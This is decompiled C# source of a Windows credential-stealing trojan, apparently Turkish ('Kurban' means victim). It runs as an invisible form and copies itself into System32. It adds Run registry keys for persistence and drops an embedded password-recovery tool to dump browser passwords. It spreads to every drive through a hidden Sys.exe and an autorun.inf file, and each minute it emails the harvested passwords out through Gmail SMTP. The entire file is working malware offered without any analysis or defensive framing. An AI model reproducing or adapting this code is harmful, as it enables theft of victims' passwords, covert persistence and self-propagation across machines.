using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using sadfasdfjhbjhbajeb123.My;
using sadfasdfjhbjhbajeb123.My.Resources;

namespace sadfasdfjhbjhbajeb123;

[DesignerGenerated]
public class Form1 : Form
{
	private IContainer components;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("BackgroundWorker1")]
	private BackgroundWorker _BackgroundWorker1;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("lblNumb")]
	private Label _lblNumb;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Timer3")]
	private Timer _Timer3;

	private string Stub;

	private string text1;

	private string text2;

	private string[] settings;

	private string user;

	private string pass;

	private string Stored;

	private const string FileSplit = "JTRuST";

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual BackgroundWorker BackgroundWorker1
	{
		[DebuggerNonUserCode]
		get
		{
			return _BackgroundWorker1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			DoWorkEventHandler value2 = BackgroundWorker1_DoWork;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork -= value2;
			}
			_BackgroundWorker1 = value;
			if (_BackgroundWorker1 != null)
			{
				_BackgroundWorker1.DoWork += value2;
			}
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual Label lblNumb
	{
		[DebuggerNonUserCode]
		get
		{
			return _lblNumb;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_lblNumb = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Timer Timer2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer2_Tick;
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick(eventHandler);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Timer3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer3_Tick;
			if (_Timer3 != null)
			{
				_Timer3.remove_Tick(eventHandler);
			}
			_Timer3 = value;
			if (_Timer3 != null)
			{
				_Timer3.add_Tick(eventHandler);
			}
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_01d8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01e2: Expected O, but got Unknown
		components = new Container();
		TextBox1 = new TextBox();
		BackgroundWorker1 = new BackgroundWorker();
		TextBox2 = new TextBox();
		lblNumb = new Label();
		Label1 = new Label();
		Timer2 = new Timer(components);
		Timer3 = new Timer(components);
		((Control)this).SuspendLayout();
		TextBox textBox = TextBox1;
		Point location = new Point(21, 24);
		((Control)textBox).set_Location(location);
		TextBox1.set_Multiline(true);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(248, 225);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		TextBox textBox3 = TextBox2;
		location = new Point(21, 255);
		((Control)textBox3).set_Location(location);
		TextBox2.set_Multiline(true);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox textBox4 = TextBox2;
		size = new Size(248, 112);
		((Control)textBox4).set_Size(size);
		((Control)TextBox2).set_TabIndex(1);
		lblNumb.set_AutoSize(true);
		((Control)lblNumb).set_Font(new Font("Tahoma", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)lblNumb).set_ForeColor(Color.Red);
		Label obj = lblNumb;
		location = new Point(54, 380);
		((Control)obj).set_Location(location);
		((Control)lblNumb).set_Name("lblNumb");
		Label obj2 = lblNumb;
		size = new Size(14, 13);
		((Control)obj2).set_Size(size);
		((Control)lblNumb).set_TabIndex(19);
		lblNumb.set_Text("0");
		Label1.set_AutoSize(true);
		((Control)Label1).set_Font(new Font("Tahoma", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label = Label1;
		location = new Point(12, 380);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(42, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(20);
		Label1.set_Text("Kayıtlı :");
		Timer2.set_Enabled(true);
		Timer2.set_Interval(50000);
		Timer3.set_Enabled(true);
		Timer3.set_Interval(60000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(0, 0);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)lblNumb);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)TextBox2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	public string wpv()
	{
		byte[] array = Resources.wpv;
		FileSystem.FileOpen(1, Interaction.Environ("tmp") + "\\wpv.exe", (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
		FileSystem.FilePut(1, (Array)array, -1L, false, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.Shell(Interaction.Environ("tmp") + "\\wpv.exe /stext " + Interaction.Environ("tmp") + "\\wpv.txt", (AppWinStyle)0, false, -1);
		return File.ReadAllText(Interaction.Environ("tmp") + "\\wpv.txt");
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		FileSystem.FileOpen(1, Application.get_ExecutablePath(), (OpenMode)32, (OpenAccess)1, (OpenShare)3, -1);
		checked
		{
			text1 = Strings.Space((int)FileSystem.LOF(1));
			text2 = Strings.Space((int)FileSystem.LOF(1));
			FileSystem.FileGet(1, ref text1, -1L, false);
			FileSystem.FileGet(1, ref text2, -1L, false);
			FileSystem.FileClose(new int[1] { 1 });
			settings = Strings.Split(text1, "JTRuST", -1, (CompareMethod)0);
			user = settings[1];
			pass = settings[2];
			try
			{
				string fileName = Path.GetFileName(Application.get_ExecutablePath());
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), "C:\\Windows\\System32" + fileName, true);
				RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
				registryKey.SetValue(fileName, "msnmgr");
				registryKey.Close();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				AddStartup(((Form)this).get_Text(), Application.get_ExecutablePath());
				ProjectData.ClearProjectError();
			}
			Timer2.Start();
			Timer3.Start();
		}
	}

	public static void AddStartup(string Name, string Path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Name, Path, RegistryValueKind.String);
	}

	private void BackgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		checked
		{
			try
			{
				ListBox val = new ListBox();
				for (int i = 0; i != ((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives().Count - 1; i++)
				{
					val.get_Items().Add((object)((ServerComputer)MyProject.Computer).get_FileSystem().get_Drives()[i].ToString());
				}
				for (int i = 0; i != val.get_Items().get_Count(); i++)
				{
					try
					{
						try
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
							((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")));
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
						}
						((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe")));
						FileSystem.FileOpen(1, Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf")), (OpenMode)32, (OpenAccess)(-1), (OpenShare)(-1), -1);
						FileSystem.FilePut(1, "[autorun]\r\nshellexecute=sys.exe", -1L, false);
						FileSystem.FileClose(new int[1] { 1 });
						try
						{
							((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"Sys.exe"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
							((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(Conversions.ToString(Operators.AddObject(val.get_Items().get_Item(i), (object)"autorun.inf"))).Attributes = FileAttributes.Hidden | FileAttributes.System;
						}
						catch (Exception projectError2)
						{
							ProjectData.SetProjectError(projectError2);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
				}
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			wpv();
			TextBox1.set_Text(File.ReadAllText(Interaction.Environ("tmp") + "\\wpv.txt"));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void Timer3_Tick(object sender, EventArgs e)
	{
		MailMessage mailMessage = new MailMessage();
		mailMessage.From = new MailAddress(user);
		mailMessage.To.Add(user);
		mailMessage.Subject = "C:\\ Browser Hunter : Şifreler  Kurban : " + ((ServerComputer)MyProject.Computer).get_Name();
		mailMessage.Body = TextBox1.get_Text();
		SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
		smtpClient.Port = 587;
		smtpClient.Credentials = new NetworkCredential(user, pass);
		smtpClient.EnableSsl = true;
		smtpClient.Send(mailMessage);
	}
}
